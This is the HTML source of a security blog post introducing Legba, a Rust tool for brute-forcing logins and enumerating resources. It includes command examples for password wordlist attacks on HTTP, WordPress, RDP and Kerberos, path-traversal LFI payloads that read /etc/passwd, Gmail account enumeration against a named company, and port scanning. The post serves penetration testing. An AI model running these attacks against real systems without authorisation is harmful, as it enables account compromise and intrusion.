@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="During the last few weeks I’ve been working on a new tool that started as a way for me to become more familiar with Rust and its tokio asynchronous runtime and then quickly turned into quite a compreh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Enumerate&#x2F;Bruteforce&#x2F;Attack All the Things! Presenting Legba">
+<meta property="og:url" content="https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/index.html">
+<meta property="og:site_name" content="evilsocket">
+<meta property="og:description" content="During the last few weeks I’ve been working on a new tool that started as a way for me to become more familiar with Rust and its tokio asynchronous runtime and then quickly turned into quite a compreh">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/VeveLegba.svg/800px-VeveLegba.svg.png">
+<meta property="article:published_time" content="2023-11-02T16:46:32.000Z">
+<meta property="article:modified_time" content="2023-11-02T17:55:18.872Z">
+<meta property="article:author" content="Simone Margaritelli">
+<meta property="article:tag" content="rust">
+<meta property="article:tag" content="tokio">
+<meta property="article:tag" content="async">
+<meta property="article:tag" content="bruteforce">
+<meta property="article:tag" content="wordlist">
+<meta property="article:tag" content="dns subdomain enumeration">
+<meta property="article:tag" content="password">
+<meta property="article:tag" content="authentication">
+<meta property="article:tag" content="red team">
+<meta property="article:tag" content="multi protocol">
+<meta property="article:tag" content="legba">
+<meta property="article:tag" content="hydra">
+<meta property="article:tag" content="amqp">
+<meta property="article:tag" content="http">
+<meta property="article:tag" content="csrf token">
+<meta property="article:tag" content="ntlm">
+<meta property="article:tag" content="kerberos">
+<meta property="article:tag" content="kerberos pre-authentication">
+<meta property="article:tag" content="imap">
+<meta property="article:tag" content="ldap">
+<meta property="article:tag" content="mongodb">
+<meta property="article:tag" content="oracle">
+<meta property="article:tag" content="mssql">
+<meta property="article:tag" content="mysql">
+<meta property="article:tag" content="cassandra">
+<meta property="article:tag" content="pgsql">
+<meta property="article:tag" content="pop3">
+<meta property="article:tag" content="rdp">
+<meta property="article:tag" content="redis">
+<meta property="article:tag" content="scylladb">
+<meta property="article:tag" content="sftp">
+<meta property="article:tag" content="smtp">
+<meta property="article:tag" content="ssh">
+<meta property="article:tag" content="stomp">
+<meta property="article:tag" content="port scanner">
+<meta property="article:tag" content="telnet">
+<meta property="article:tag" content="vnc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/VeveLegba.svg/800px-VeveLegba.svg.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+          
+        
+    
+    <!-- title -->
+    <title>Enumerate/Bruteforce/Attack All the Things! Presenting Legba</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">~/</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2022/10/20/Reverse-Engineering-the-Apple-MultiPeer-Connectivity-Framework/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&text=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&is_video=false&description=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Enumerate/Bruteforce/Attack All the Things! Presenting Legba&body=Check out this article: https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&title=Enumerate/Bruteforce/Attack All the Things! Presenting Legba"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/2023/11/02/Enumerate-Bruteforce-Attack-All-The-Things-Presenting-Legba/&name=Enumerate/Bruteforce/Attack All the Things! Presenting Legba&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rust-Async-FTW"><span class="toc-number">2.</span> <span class="toc-text">Rust + Async FTW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-Framework-For-Everything"><span class="toc-number">3.</span> <span class="toc-text">A Framework For Everything</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#All-the-HTTP-Things"><span class="toc-number">3.1.</span> <span class="toc-text">All the HTTP Things</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Subdomain-Enumeration"><span class="toc-number">3.2.</span> <span class="toc-text">DNS Subdomain Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-Port-Scanning"><span class="toc-number">3.3.</span> <span class="toc-text">TCP Port Scanning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Other-Protocols"><span class="toc-number">3.4.</span> <span class="toc-text">Other Protocols</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fin"><span class="toc-number">4.</span> <span class="toc-text">Fin</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline" style="text-transform: uppercase;">
+        Enumerate/Bruteforce/Attack All the Things! Presenting Legba
+    </h1>
+
+
+
+    <div class="meta">
+      
+    <div class="postdate">
+        <time datetime="2023-11-02T16:46:32.000Z" itemprop="datePublished">2023-11-02</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/amqp/" rel="tag">amqp</a>, <a class="tag-link-link" href="/tags/async/" rel="tag">async</a>, <a class="tag-link-link" href="/tags/authentication/" rel="tag">authentication</a>, <a class="tag-link-link" href="/tags/bruteforce/" rel="tag">bruteforce</a>, <a class="tag-link-link" href="/tags/cassandra/" rel="tag">cassandra</a>, <a class="tag-link-link" href="/tags/csrf-token/" rel="tag">csrf token</a>, <a class="tag-link-link" href="/tags/dns-subdomain-enumeration/" rel="tag">dns subdomain enumeration</a>, <a class="tag-link-link" href="/tags/http/" rel="tag">http</a>, <a class="tag-link-link" href="/tags/hydra/" rel="tag">hydra</a>, <a class="tag-link-link" href="/tags/imap/" rel="tag">imap</a>, <a class="tag-link-link" href="/tags/kerberos/" rel="tag">kerberos</a>, <a class="tag-link-link" href="/tags/kerberos-pre-authentication/" rel="tag">kerberos pre-authentication</a>, <a class="tag-link-link" href="/tags/ldap/" rel="tag">ldap</a>, <a class="tag-link-link" href="/tags/legba/" rel="tag">legba</a>, <a class="tag-link-link" href="/tags/mongodb/" rel="tag">mongodb</a>, <a class="tag-link-link" href="/tags/mssql/" rel="tag">mssql</a>, <a class="tag-link-link" href="/tags/multi-protocol/" rel="tag">multi protocol</a>, <a class="tag-link-link" href="/tags/mysql/" rel="tag">mysql</a>, <a class="tag-link-link" href="/tags/ntlm/" rel="tag">ntlm</a>, <a class="tag-link-link" href="/tags/oracle/" rel="tag">oracle</a>, <a class="tag-link-link" href="/tags/password/" rel="tag">password</a>, <a class="tag-link-link" href="/tags/pgsql/" rel="tag">pgsql</a>, <a class="tag-link-link" href="/tags/pop3/" rel="tag">pop3</a>, <a class="tag-link-link" href="/tags/port-scanner/" rel="tag">port scanner</a>, <a class="tag-link-link" href="/tags/rdp/" rel="tag">rdp</a>, <a class="tag-link-link" href="/tags/red-team/" rel="tag">red team</a>, <a class="tag-link-link" href="/tags/redis/" rel="tag">redis</a>, <a class="tag-link-link" href="/tags/rust/" rel="tag">rust</a>, <a class="tag-link-link" href="/tags/scylladb/" rel="tag">scylladb</a>, <a class="tag-link-link" href="/tags/sftp/" rel="tag">sftp</a>, <a class="tag-link-link" href="/tags/smtp/" rel="tag">smtp</a>, <a class="tag-link-link" href="/tags/ssh/" rel="tag">ssh</a>, <a class="tag-link-link" href="/tags/stomp/" rel="tag">stomp</a>, <a class="tag-link-link" href="/tags/telnet/" rel="tag">telnet</a>, <a class="tag-link-link" href="/tags/tokio/" rel="tag">tokio</a>, <a class="tag-link-link" href="/tags/vnc/" rel="tag">vnc</a>, <a class="tag-link-link" href="/tags/wordlist/" rel="tag">wordlist</a>
+    </div>
+
+
+    </div>
+
+    <div class="addthis_sharing_toolbox"></div>
+  </header>
+
+    <br/>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>During the last few weeks I’ve been working on a new tool that started as a way for me to become more familiar with Rust and its <a target="_blank" rel="noopener" href="https://tokio.rs/">tokio asynchronous runtime</a> and then quickly turned into quite a comprehensive and efficient replacement for similar tools (thc-hydra, medusa, patator, etc). In this blog post I’m going to briefly present <a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba">project Legba</a>, the reasons behind its implementation and a few of the many possible use cases.</p>
+<a href="https://en.wikipedia.org/wiki/Papa_Legba" target="_blank">
+<img width="350px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/VeveLegba.svg/800px-VeveLegba.svg.png"/>
+</a>
+
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it evilsocket/legba:latest -h </span><br></pre></td></tr></table></figure>
+
+<p>Don’t forget to <a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba/wiki">RTFM</a>.</p>
+<h2 id="Rust-Async-FTW"><a href="#Rust-Async-FTW" class="headerlink" title="Rust + Async FTW"></a>Rust + Async FTW</h2><p>When searching for authentication bruteforcing and wordlist attack tools, most of the times <a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">THC Hydra</a> is presented as the de facto standard, with some minor alternatives that are either 1-to-1 copies of it, much slower Python implementations, or protocol specific implementations.</p>
+<p>While studying Hydra source code, three main factors caught my attention:</p>
+<ol>
+<li>It’s using <a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-mod.c">blocking sockets</a>, meaning suboptimal scaling of I/O concurrent operations.</li>
+<li>It’s implemented in a non memory safe language.</li>
+<li>It does not support modern features such as CSRF token grabbing for HTTP requests, Kerberos Pre-Auth and more.</li>
+</ol>
+<p>For these reasons (and because I was a bit bored after months of not coding anything) I decided to work on Legba, with the following objectives in mind:</p>
+<ol>
+<li>Use Rust which would not only make the tool blazing fast, but memory safe and efficient.</li>
+<li>Use an asynchronous runtime in order to get the best possible performance.</li>
+<li>Implement it as a generic framework that supports highly modular plugins in order to easily add new features without touching the core.</li>
+</ol>
+<p>After some hours of coding, refactoring and optimizing I’ve come up with something that’s (in my opinion) pretty great. With an average runtime memory usage of less than 15MB, Legba beats Hydra in terms of efficiency by several orders of magnitude. </p>
+<p>Here’s a benchmark of the two running some common plugins, both targeting the same test servers on localhost. The benchmark has been executed on a macOS laptop with an M1 Max CPU, using a wordlist of 1000 passwords with the correct one being on the last line. Legba was compiled in release mode, Hydra compiled and installed via <a target="_blank" rel="noopener" href="https://formulae.brew.sh/formula/hydra">brew formula</a>.</p>
+<p>Far from being an exhaustive benchmark, this table still gives a clear idea of how using an asynchronous runtime can drastically improve performances.</p>
+<table>
+<thead>
+<tr>
+<th>Test Name</th>
+<th>Hydra Tasks</th>
+<th>Hydra Time</th>
+<th>Legba Tasks</th>
+<th>Legba Time</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HTTP basic auth</td>
+<td>16</td>
+<td>7.100s</td>
+<td>10</td>
+<td>1.560s <strong>(🚀 4.5x faster)</strong></td>
+</tr>
+<tr>
+<td>HTTP POST login (wordpress)</td>
+<td>16</td>
+<td>14.854s</td>
+<td>10</td>
+<td>5.045s <strong>(🚀 2.9x faster)</strong></td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>16</td>
+<td>7m29.85s *</td>
+<td>10</td>
+<td>8.150s <strong>(🚀 55.1x faster)</strong></td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>4 **</td>
+<td>9.819s</td>
+<td>4 **</td>
+<td>2.542s <strong>(🚀 3.8x faster)</strong></td>
+</tr>
+<tr>
+<td>Microsoft SQL</td>
+<td>16</td>
+<td>7.609s</td>
+<td>10</td>
+<td>4.789s <strong>(🚀 1.5x faster)</strong></td>
+</tr>
+</tbody></table>
+<p><sup>* While this result would suggest a default delay between connection attempts used by Hydra. I’ve tried to study the source code to find such delay but to my knowledge there’s none. For some reason it’s simply very slow.</sup><br><sup>** For MySQL hydra automatically reduces the amount of tasks to 4, therefore legba’s concurrency level has been adjusted to 4 as well.</sup></p>
+<p>Note how, while using less concurrent tasks, Legba is faster and in most cases more memory efficient.</p>
+<h2 id="A-Framework-For-Everything"><a href="#A-Framework-For-Everything" class="headerlink" title="A Framework For Everything"></a>A Framework For Everything</h2><p>After implementing the core framework and the first protocol plugins, I realized that the tool functionalities went beyond just attacking authentication mechanisms via bruteforcing and wordlist attacks. Any type of enumeration task that requires an efficient parallelism and network I/O would be a good fit for it. This resulted in an extensive list of modules covering both authentication and enumeration of resources. I’ll add here just a few use cases, I highly recommend you guys to check <a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba/wiki">the project wiki</a> for the documentation and a full list of features.</p>
+<h3 id="All-the-HTTP-Things"><a href="#All-the-HTTP-Things" class="headerlink" title="All the HTTP Things"></a>All the HTTP Things</h3><p>The very first module I developed, of course, was the HTTP module, which quickly became a set of different submodules supporting all sorts of things, such as:</p>
+<p><strong>HTTP Basic Authentication</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba http.basic \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/</span><br></pre></td></tr></table></figure>
+
+<p><strong>HTTP Requests with NTLMv1 and NTLMv2 Authentication</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">legba http.ntlm2 \ <span class="comment"># use http.ntlm1 for v1.0</span></span><br><span class="line">    --domain example.org \</span><br><span class="line">    --workstation client \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target https://localhost:8888/</span><br></pre></td></tr></table></figure>
+
+<p><strong>HTTP Pages Enumeration</strong></p>
+<p>This was implemented to replace <a target="_blank" rel="noopener" href="https://github.com/evilsocket/dirsearch">dirsearch</a>.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">legba http.enum \</span><br><span class="line">    --payloads data/pages.txt \</span><br><span class="line">    --target http://localhost:8888/ \</span><br><span class="line">    --http-enum-ext php \ <span class="comment"># php is the default value for file extensions</span></span><br><span class="line">    --http-success-codes 200 </span><br></pre></td></tr></table></figure>
+
+<p>Wordpress plugin discovery using interpolation syntax:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba http.enum \</span><br><span class="line">    --payloads data/wordpress-plugins.txt \</span><br><span class="line">    --target http://localhost:8888/wp-content/plugins/&#123;PAYLOAD&#125;/readme.txt \</span><br><span class="line">    --http-success-codes 200 </span><br></pre></td></tr></table></figure>
+
+<p>LFI vulnerability fuzzing:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba http.enum \</span><br><span class="line">    --payloads data/lfi.txt \</span><br><span class="line">    --target http://localhost:8888/ \</span><br><span class="line">    --http-success-string <span class="string">&quot;root:&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>The <code>data/lfi.txt</code> would be something like:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br><span class="line">file?filename&#x3D;..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc&#x2F;passwd</span><br><span class="line">...</span><br><span class="line">... and so on ...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>Google Suite / GMail valid accounts enumeration (this is a pretty neat trick that <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1720063591007543775">I’ve recently found out about</a>):</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">legba http.enum \</span><br><span class="line">    --payloads data/employees-names.txt \</span><br><span class="line">    --http-success-string <span class="string">&quot;COMPASS&quot;</span> \</span><br><span class="line">    --http-success-codes 204 \</span><br><span class="line">    --quiet \</span><br><span class="line">    --target <span class="string">&quot;https://mail.google.com/mail/gxlu?email=&#123;PAYLOAD&#125;@broadcom.com&quot;</span> </span><br></pre></td></tr></table></figure>
+
+<p><strong>Various web login pages</strong></p>
+<p>HTTP Post Request (Wordpress wp-login.php page):</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">legba http \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/wp-login.php \</span><br><span class="line">    --http-method POST \</span><br><span class="line">    --http-success-codes 302 \ <span class="comment"># wordpress redirects on successful login</span></span><br><span class="line">    --http-payload <span class="string">&#x27;log=&#123;USERNAME&#125;&amp;pwd=&#123;PASSWORD&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>HTTP Post Request (Wordpress xmlrpc.php)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">legba http \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/xmlrpc.php \</span><br><span class="line">    --http-method POST \</span><br><span class="line">    --http-payload <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;&#123;USERNAME&#125;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;&#123;PASSWORD&#125;&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&#x27;</span> \</span><br><span class="line">    --http-success-string <span class="string">&#x27;isAdmin&#x27;</span> <span class="comment"># what string successful response will contain</span></span><br></pre></td></tr></table></figure>
+
+<p>Or using the @ syntax to load the payload from a file:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">legba http \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/xmlrpc.php \</span><br><span class="line">    --http-method POST \</span><br><span class="line">    --http-payload @xmlrpc-payload.xml \</span><br><span class="line">    --http-success-string <span class="string">&#x27;isAdmin&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>HTTP Post Request with CSRF Token grabbing:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">legba http \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --target http://localhost:8888/ \</span><br><span class="line">    --http-csrf-page http://localhost:8888/ \ <span class="comment"># where to grab the CSRF token from, or empty if it&#x27;s the same as --target</span></span><br><span class="line">    --http-csrf-regexp <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;(token)&quot; value=&quot;([^\&quot;]+)&quot;&#x27;</span> \ <span class="comment"># regular expression to extract it</span></span><br><span class="line">    --http-method POST \</span><br><span class="line">    --http-payload <span class="string">&#x27;user=&#123;USERNAME&#125;&amp;pass=&#123;PASSWORD&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="DNS-Subdomain-Enumeration"><a href="#DNS-Subdomain-Enumeration" class="headerlink" title="DNS Subdomain Enumeration"></a>DNS Subdomain Enumeration</h3><p>I wanted to write something faster and simpler than my <a target="_blank" rel="noopener" href="https://github.com/evilsocket/xray">XRay</a>, therefore:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba dns \</span><br><span class="line">    --payloads data/200k-dns.txt \</span><br><span class="line">    --target something.com \</span><br><span class="line">    --dns-resolvers <span class="string">&quot;1.1.1.1&quot;</span> <span class="comment"># comma separated list of DNS resolvers, do not pass to use the system resolver</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="TCP-Port-Scanning"><a href="#TCP-Port-Scanning" class="headerlink" title="TCP Port Scanning"></a>TCP Port Scanning</h3><p>Because why the hell not?! :D</p>
+<p>Scan all TCP ports with a 300ms timeout:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">legba tcp.ports \</span><br><span class="line">    --target something.com \</span><br><span class="line">    --timeout 300 </span><br></pre></td></tr></table></figure>
+
+<p>Scan a custom range of ports with a 300ms timeout:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba tcp.ports \</span><br><span class="line">    --target something.com \</span><br><span class="line">    --tcp-ports <span class="string">&#x27;80-10000&#x27;</span> \</span><br><span class="line">    --timeout 300 </span><br></pre></td></tr></table></figure>
+
+<p>Scan a custom list of ports with a 300ms timeout:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba tcp.ports \</span><br><span class="line">    --target something.com \</span><br><span class="line">    --tcp-ports <span class="string">&#x27;21, 22, 80, 443, 8080&#x27;</span> \</span><br><span class="line">    --timeout 300 </span><br></pre></td></tr></table></figure>
+
+<h3 id="Other-Protocols"><a href="#Other-Protocols" class="headerlink" title="Other Protocols"></a>Other Protocols</h3><p><strong>Kerberos 5 Pre-Auth (users enumeration and password authentication).</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">legba kerberos \</span><br><span class="line">    --target dc.example.org \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password wordlists/passwords.txt \</span><br><span class="line">    --kerberos-realm example.org</span><br></pre></td></tr></table></figure>
+
+<p><strong>Microsoft Remote Desktop</strong></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legba rdp \</span><br><span class="line">    --target localhost:3389 \</span><br><span class="line">    --username admin \</span><br><span class="line">    --password data/passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p>The list goes on and on, at the time of writing (<a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba/wiki">check the wiki for updates!</a>) the list of supported features and protocols is: AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace), Cassandra/ScyllaDB, DNS subdomain enumeration, FTP, HTTP (basic authentication, NTLMv1, NTLMv2, multipart form, custom requests with CSRF support and files/folders enumeration), IMAP, Kerberos pre-authentication and user enumeration, LDAP, MongoDB, Microsoft SQL, MySQL, Oracle, PostgreSQL, POP3, RDP, Redis, SSH / SFTP, SMTP, STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ), TCP port scanning, Telnet, VNC.</p>
